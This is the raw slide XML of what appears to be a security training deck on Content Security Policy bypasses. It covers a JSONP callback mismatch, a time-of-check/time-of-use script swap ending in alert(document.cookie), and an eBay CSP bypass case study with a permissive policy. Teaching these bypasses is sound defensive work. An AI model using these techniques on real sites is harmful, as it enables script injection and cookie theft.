        <p:spPr>
          <a:xfrm>
            <a:off x="646628" y="6486303"/>
            <a:ext cx="3706058" cy="554712"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5068"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="834033" y="6626797"/>
            <a:ext cx="3331250" cy="27372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alert({"data":"value"})</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4673322" y="2310170"/>
            <a:ext cx="3957280" cy="5013008"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 710"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4860727" y="2464951"/>
            <a:ext cx="2811423" cy="351353"/>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Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4860727" y="2971086"/>
            <a:ext cx="3582472" cy="821547"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2150"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F6F0E4"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Server uses first callback parameter</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2150"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F6F0E4"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CSP checks last callback parameter</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2150"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F6F0E4"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Mismatch allows bypass</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68598" y="805815"/>
            <a:ext cx="10232946" cy="556736"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Method 5: Time-of-Check Time-of-Use (TOCTOU)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1168598" y="1418511"/>
            <a:ext cx="2672358" cy="334089"/>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Concept:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1168598" y="1962507"/>
            <a:ext cx="12293203" cy="318016"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Change script content after CSP validation but before execution.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1168598" y="2490430"/>
            <a:ext cx="2672358" cy="334089"/>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Attack Steps:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1168598" y="3034427"/>
            <a:ext cx="4097655" cy="712589"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1346716" y="3886914"/>
            <a:ext cx="3741420" cy="556498"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 1: Host script with benign content</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1346716" y="4600813"/>
            <a:ext cx="3741420" cy="775811"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3445"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1337905" y="4600813"/>
            <a:ext cx="3759041" cy="775811"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3445"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1516023" y="4734401"/>
            <a:ext cx="3402806" cy="508635"/>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 https://victim.com/user-script.js</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console.log('Hello World');</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Image 1" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5266253" y="3034427"/>
            <a:ext cx="4097774" cy="712589"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5444371" y="3886914"/>
            <a:ext cx="3287197" cy="278249"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 2: Wait for CSP validation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Image 2" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9364028" y="3034427"/>
            <a:ext cx="4097774" cy="712589"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9542145" y="3886914"/>
            <a:ext cx="3741539" cy="556498"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 3: Replace with malicious content</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9542145" y="4600813"/>
            <a:ext cx="3741539" cy="1030129"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2594"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9533334" y="4600813"/>
            <a:ext cx="3759160" cy="1030129"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2594"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9711452" y="4734401"/>
            <a:ext cx="3402925" cy="762953"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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 https://victim.com/user-script.js (updated)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2EFE8"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>alert(document.cookie);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1168598" y="6018967"/>
            <a:ext cx="2672358" cy="334089"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it might work:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1168598" y="6562963"/>
            <a:ext cx="12293203" cy="763444"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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CSP validates at load time</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>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Script can change before execution</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="20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Race condition exploitation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778240" y="0"/>
            <a:ext cx="5852160" cy="8229600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="1503283"/>
            <a:ext cx="904875" cy="426244"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6386"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBE8F0"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>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9878" y="1625679"/>
            <a:ext cx="181451" cy="181451"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1202055" y="1571268"/>
            <a:ext cx="360521" cy="290274"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2020</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="2020253"/>
            <a:ext cx="7190661" cy="1956435"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="7700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="6150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="325F7B"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Case Study: Real-World Attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="431684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eBay CSP Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="5365790"/>
            <a:ext cx="7190661" cy="1360527"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>In 2020, security researcher </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Yasser Ali</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> discovered a critical CSP bypass vulnerability in eBay that allowed full account takeover.</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76343"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1308378" y="2865596"/>
            <a:ext cx="4484489" cy="544116"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable CSP Policy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1308378" y="3610094"/>
            <a:ext cx="12013644" cy="1737598"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1503"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1299686" y="3610094"/>
            <a:ext cx="12031028" cy="1737598"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1503"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1473756" y="3740587"/>
            <a:ext cx="11682889" cy="1476613"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Content-Security-Policy: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>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script-src 'self' 'unsafe-inline' 'unsafe-eval' </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>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https://*.ebay.com </a:t>
            </a:r>
